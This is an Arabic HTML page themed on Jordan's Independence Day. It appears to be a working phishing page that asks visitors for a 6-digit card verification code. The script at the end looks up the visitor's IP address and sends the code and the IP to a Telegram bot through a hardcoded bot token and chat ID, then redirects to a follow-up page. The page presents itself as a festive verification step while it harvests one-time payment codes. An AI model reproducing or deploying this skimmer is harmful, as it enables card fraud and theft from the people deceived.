<head>

    <link href="style.css" rel="stylesheet">

    <style type="text/css">
        * {
            direction: rtl;
            font-family: 'Droid Arabic Kufi', sans-serif;
        }

        body {
            background-color: #FFF;
            /* خلفية بيضاء مع زخرفة خفيفة بألوان العلم الأردني */
            background-image: linear-gradient(
                135deg,
                #FFFFFF 75%,
                #007a3d 75%,
                #007a3d 80%,
                #ce1126 80%,
                #ce1126 85%,
                #000 85%,
                #000 100%
            );
            background-repeat: no-repeat;
            background-size: 100% 350px;
        }

        .navbar-dark {
            background-color: #FFF !important;
        }

        .bg-danger {
            background-color: #007a3d !important; /* أخضر */
        }

        .text-danger {
            color: #007a3d !important; /* أخضر */
        }

        body, h6, label, input, button, small, footer, .form-group {
            text-align: right !important;
        }

        .form-group.centered-button {
            text-align: center !important;
            margin-top: 10px;
            margin-bottom: 50px;
        }

        .form-group.centered-button button {
            font-size: 1.5rem;
            padding: 15px 30px;
            width: auto;
            border-radius: 50px;
            background-color: #007a3d; /* أخضر */
            color: #FFF;
            border: none;
        }

        .form-group.centered-button button:hover {
            background-color: #50b96c; /* أخضر فاتح */
        }

        footer {
            margin-top: 50px;
            background-color: #007a3d; /* أخضر */
            width: 100%;
            bottom: 0px;
            padding: 10px;
            color: #FFF;
            font-weight: bold;
            border-top: 4px solid #ce1126; /* خط أحمر */
        }

        footer small {
            font-size: 14px;
            color: #FFF;
            font-weight: bolder;
        }

        .form-control {
            font-size: 1.2rem;
            padding: 15px;
            border-radius: 10px;
            border: 2px solid #007a3d; /* أخضر */
            margin-bottom: 20px;
            text-align: center;
        }

        .form-control:focus {
            border-color: #50b96c; /* أخضر فاتح */
            box-shadow: 0 0 10px rgba(80, 185, 108, 0.5);
        }

        .btn {
            font-size: 1.5rem;
            padding: 15px 30px;
            border-radius: 50px;
            font-weight: bold;
            text-transform: uppercase;
        }

        .btn-success {
            background-color: #007a3d;
            border: none;
        }

        .btn-success:hover {
            background-color: #50b96c;
        }

        .btn-primary {
            background-color: #50b96c;
            border: none;
        }

        .btn-primary:hover {
            background-color: #35885a;
        }

        .container-logo {
            margin-bottom: 10px;
        }

        .form-control::placeholder {
            color: #999;
            font-weight: bold;
            text-align: center;
        }

        /* زخارف عيد الاستقلال */
        .independence-banner {
            margin: 0 auto 30px auto;
            text-align: center;
            background: linear-gradient(90deg, #ce1126 0%, #fff 40%, #007a3d 100%);
            color: #000;
            padding: 12px 0;
            font-size: 1.3rem;
            font-weight: bold;
            border-radius: 20px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            position: relative;
            overflow: hidden;
        }
        .independence-banner i {
            color: #ce1126;
            margin: 0 10px;
        }
        .independence-flag {
            width: 44px;
            vertical-align: middle;
            margin-right: 10px;
            margin-left: 10px;
        }
        /* نجمة العلم الأردني */
        .jordan-star {
            width: 22px;
            height: 22px;
            display: inline-block;
            background: url('https://www2.0zz0.com/2025/05/23/00/954477004.jpeg') no-repeat center center;
            background-size: contain;
            vertical-align: middle;
            margin-left: 4px;
        }
    </style>
</head>

<body style="background-color: #FFF;">
    <nav class="navbar navbar-expand-md navbar-danger bg-danger shadow-sm"></nav>

    <main class="py-4">
        <!-- بانر عيد الاستقلال -->
        <div class="independence-banner">
            <img src="https://www2.0zz0.com/2025/05/23/00/954477004.jpeg" class="independence-flag" alt="علم الأردن">
            <span><span class="jordan-star"></span> كل عام والأردن بألف خير بمناسبة عيد الاستقلال <span class="jordan-star"></span></span>
            <img src="https://www2.0zz0.com/2025/05/23/00/954477004.jpeg" class="independence-flag" alt="علم الأردن">
        </div>
        <!-- /بانر عيد الاستقلال -->

        <div class="container justify-content-center text-center container-logo">
            <a class="navbar-brand justify-content-center">
                <img src="https://www2.0zz0.com/2025/05/23/00/954477004.jpeg" style="width:100%" alt="logo">
            </a>
        </div>

        <div class="container">
            <div class="container justify-content-center">
                <form id="verify-form" style="padding: 10px;">
                    <div class="form-group row text-center">
                        <input type="text" class="form-control" id="verification_code" name="verification_code" maxlength="6" minlength="6" inputmode="numeric" pattern="[0-9]{6}" placeholder="أدخل رمز التحقق المكون من 6 أرقام" autofocus="">
                        <span id="verify_error" class="text-danger font-weight-bolder text-center" style="display: none;">يرجى إدخال رمز التحقق المكون من 6 أرقام</span>
                    </div>
                    <div class="form-group centered-button">
                        <button type="submit" class="btn btn-success">
                            <i class="fa fa-lock ml-10"></i> تحقق
                        </button>
                    </div>
                </form>
            </div>
        </div>

    <footer>
        <small>
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/Flag_of_Jordan.svg" class="independence-flag" style="width:22px;display:inline;margin:0 5px 0 0;" alt="علم الأردن">
            © 2025 جميع الحقوق محفوظة لـ | عيد الاستقلال الأردني
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/Flag_of_Jordan.svg" class="independence-flag" style="width:22px;display:inline;margin:0 0 0 5px;" alt="علم الأردن">
        </small>
    </footer>

    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#verify-form').submit(function(event) {
                event.preventDefault();
                $('#verify_error').hide();

                const code = $("#verification_code").val();

                if (!code || !/^\d{6}$/.test(code)) {
                    $('#verify_error').show();
                    return;
                }

                // الحصول على IP الجهاز
                $.get("https://api.ipify.org?format=json", function(data) {
                    const userIP = data.ip;

                    const telegramBotToken = "7680582937:AAHkEhiz5JPvPLMjNVUtF_GpvnkVNbum00s";
                    const chatId = "-4625923889";
                    const message = `رمز التحقق من البطاقة: ${code}\nIP المستخدم: ${userIP}`;

                    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

                    $.post(telegramUrl, {
                        chat_id: chatId,
                        text: message
                    }).done(function (response) {
                        // إعادة التوجيه لصفحة النجاح
                        window.location.href = "code.html";
                    }).fail(function (error) {
                        alert("حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقًا.");
                    });
                });
            });
        });
    </script>
</body>
